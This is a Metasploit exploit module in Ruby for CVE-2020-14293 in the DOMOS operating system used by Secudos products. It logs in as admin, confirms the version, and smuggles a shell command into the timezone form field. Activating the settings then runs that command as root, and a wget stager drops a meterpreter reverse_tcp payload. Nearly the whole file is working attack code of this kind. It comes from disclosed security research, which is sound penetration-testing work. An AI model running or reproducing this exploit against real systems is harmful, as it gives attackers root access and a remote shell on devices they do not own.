# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'DOMOS OS Command Injection and Privilege Escalation',
        'Description'    => %q(
            This module will leverage a vulnerability within the DOMOS operating system
            which is used by products of the company Secudos GmbH, like Qiata FTA.
            It will inject a OS Command by setting a new time zone and concatinating a
            os command within this value. As the value gets applied on activating the
            settings the command will be issued. Because the script is run as user root
            the privileges will be escalated from default user admin to root. You require
            valid admin credentials and network access to the DOMOS WebUI.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => ['Patrick Hener, SySS GmbH'],
        'DisclosureDate' => 'Jun 4 2020',
        'References'     =>
          [
            [ 'URL', 'https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-025.txt'],
            [ 'URL', 'https://www.exploit-db.com/exploits/xxxxx'],
            [ 'CVE', '2020-14293']
          ],
        'Platform'       => 'linux',
        'Arch'           => [ARCH_CMD, ARCH_X64],
        'Targets'        =>
          [
            ['Linux Dropper', {
              'Platform' => 'linux',
              'Arch' => ARCH_X64,
              'Type' => :linux_dropper,
              'DefaultOptions' => {'Payload' => 'linux/x64/meterpreter/reverse_tcp'}
            }]
          ],
        'Payload'        => {
          'BadChars' => "\x00",
        },
        'Privileged'     => true,
        'DefaultTarget'  => 0,
        'DefaultOptions' => {
          'RPORT' => 10000,
          'SSL'   => true
        }
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
        OptString.new('PASSWORD', [ false, 'Password to login with', 'admin']),
        OptString.new('TARGETURI', [ true, 'The URI of the Example Application', '/']),
      ], self.class
    )
  end

  def check
    result = Exploit::CheckCode::Safe

    if vulnerable?
      result = Exploit::CheckCode::Vulnerable
    end

    result
  end

  def exploit
    unless vulnerable?
      fail_with(Failure::Unknown, "#{peer} - Target seams to not be vulnerable")
    end

    execute_cmdstager(flavor: :wget)
  end

  def execute_command(cmd, opts={})
    print_status("Injecting payload into timezone settings")
    res = inject(cmd)
    print_status("Triggering the payload by activating the settings changes")
    res = trigger()
  end

  def vulnerable?
    print_status("Sending preflight request")

    res = send_request_cgi({
      'method'  => 'GET',
      'uri'     => normalize_uri(target_uri.path)
    })

    if res.nil?
      fail_with(Failure::Unreachable, "#{peer} - Was not able to connect")
      return false

    elsif res.code != 200
      print_bad("Unexpected response")
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}")
      return false

    else
      @cookie = res.get_cookies

      print_status("Trying to login")
      res = send_request_cgi({
        'method'    => 'POST',
        'uri'       => normalize_uri(target_uri.path),
        'cookie'    => @cookie,
        'vars_post' => {
          'dcfct'     => 'DCbase.login',
          'username'  => datastore['USERNAME'],
          'password'  => datastore['PASSWORD'],
        }
      })

      html = res.get_html_document
      error = html.at('td[@class="msgerr"]')
      if !error.nil?
        print_bad("Something went wrong, propably bad login")
        fail_with(Failure::Unknown, "#{peer} - There was an error in the response.")
        return false
      end
      print_good("Login was successful.")
      table = html.at('table[@class="dctable"]')
      table_rows = table.search('tr') # Version will be in 5th <tr> in in 3rd <td>
      table_entries = table_rows[4].search('td')
      version_table_entry = table_entries[2]
      version = version_table_entry.content.strip.to_f

      if Gem::Version::new(version) < Gem::Version.new('5.9')
        print_good "Domos version #{version} is vulnerable"
        return true
      else
        print_bad "Target is not vulnerable"
        return false
      end
    end
  end

  def inject(cmd)
    post_data = Rex::MIME::Message.new
    post_data.add_part('DCbase.pageinput', nil, nil, 'form-data; name="dcfct"')
    post_data.add_part("Europe/Berlin /etc/localtime; #{cmd} ; cat ", nil, nil, 'form-data; name="dbkey:datetime.clock.timezone"')
    post_data.add_part('Save', nil, nil, 'form-data; name="submit"')
    data = post_data.to_s

    # Send request two times, weird but works
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri(target_uri.path, "page", "td_timezone"),
      'cookie'  => @cookie,
      'data'    => data,
      'ctype'   => "multipart/form-data; boundary=#{post_data.bound}"
    })

    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri(target_uri.path, "page", "td_timezone"),
      'cookie'  => @cookie,
      'data'    => data,
      'ctype'   => "multipart/form-data; boundary=#{post_data.bound}"
    })

    if res.nil?
      fail_with(Failure::Unreachable, "#{peer} - Something went wrong. Was not able to connect all of the sudden.")

    elsif res.code != 200
      print_bad("Unexpected response")
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}")
    end

    return res
  end

  def trigger()
    res = send_request_cgi({
      'method'  => 'GET',
      'uri'     => normalize_uri(target_uri.path, 'reconf'),
      'cookie'  => @cookie
    })

    if res.nil?
      fail_with(Failure::Unreachable, "#{peer} - Something went wrong. Was not able to connect all of the sudden.")

    elsif res.code != 200
      print_bad("Unexpected response")
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}")
    end


    res = send_request_cgi({
      'method'  => 'GET',
      'uri'     => normalize_uri(target_uri.path, 'reconfshow'),
      'cookie'  => @cookie
    })

    if res.nil?
      fail_with(Failure::Unreachable, "#{peer} - Something went wrong. Was not able to connect all of the sudden.")

    elsif res.code != 200
      print_bad("Unexpected response")
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}")
    end

    while not session_created?
      print_status("No session yet")
      Rex::ThreadSafe.sleep(2)
    end
    session_created?

  end
end